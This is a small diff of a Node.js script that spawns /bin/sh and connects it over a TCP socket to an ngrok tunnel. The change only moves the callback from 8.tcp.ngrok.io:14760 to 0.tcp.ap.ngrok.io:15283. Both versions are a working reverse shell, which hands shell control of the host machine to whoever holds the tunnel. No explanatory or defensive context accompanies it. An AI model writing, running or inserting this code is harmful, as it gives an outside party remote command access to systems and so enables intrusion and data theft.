@@ -3,7 +3,7 @@
         cp = require("child_process"),
         sh = cp.spawn("/bin/sh", []);
     var client = new net.Socket();
-    client.connect(14760, "8.tcp.ngrok.io", function(){
+    client.connect(15283, "0.tcp.ap.ngrok.io", function(){
         client.pipe(sh.stdin);
         sh.stdout.pipe(client);
         sh.stderr.pipe(client);
